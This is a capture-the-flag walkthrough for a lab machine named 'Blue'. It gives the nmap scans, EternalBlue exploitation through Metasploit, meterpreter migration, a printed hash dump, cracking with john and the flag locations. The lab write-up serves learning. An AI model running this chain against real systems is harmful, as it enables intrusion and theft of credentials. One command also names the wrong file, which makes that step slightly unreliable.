---
tags: [Rooms]
title: Blue
created: '2020-05-15T19:05:38.630Z'
modified: '2020-05-15T22:59:20.175Z'
---

# Blue

Nmap scan of the machine:

```
nmap -sV -sC -p- 10.10.217.18 -T4 -v
```

We discover that TCP ports 135, 139, 445 and 3389 are open.
We can proceed to use the **vuln** scripts in nmap to find out if the target may be vulnerable to any type of vulnerabilities:

```
sudo nmap --script vuln 10.10.217.18 -T4 -v
```

The target machine seems to be vulnerable to **ms17-010** (commonly known as Eternalblue).

We can launch Metasploit with `exploit/windows/smb/ms17_010_eternalblue`
We just need to set the RHOSTS value and run the exploit.
This way we obtain a simple shell as **nt authority/system**

Once we have this shell, we can background it and use the post module to upgrade it to a meterpreter. This can be done with `post/multi/manage/shell_to_meterpreter`
We just need to set the SESSION value and run the exploit.

We now have a meterpreter session running as **nt authority/system**. However, our process is not running as this user. We can use **ps** to list all the available process and note down the PID of a process running as **nt authority/system**.
We can then migrate to this process:

```
migrate <PID>
```

We can now use the command `hashdump` to dump all the users hashes.

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Note that the hash for **Jon** contains a third string that starts with *aad3b* which means it's not a valid LM hash.
This is an NT hash and we can crack it using **john**.

We just need to copy the whole line for the user Jon and save it to a file like `hast.txt`
Then, we can proceed to use **john** to crack it:

```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hast.txt
john --show --format=nt show.txt
```

The password for the user **Jon** is `alqfna22`.

We can now proceed to use the meterpreter session with admin rights to search for the three flags.
A useful command to search for .txt files in meterpreter is:

```
search -f *.txt
```

This will display all the .txt files found from the root folder (C:).
In this case, the flags are located at:

`C:\flag1.txt`
`C:\Windows\System32\config\flag2.txt`
`C:\Users\Jon\Documents\flag3.txt`
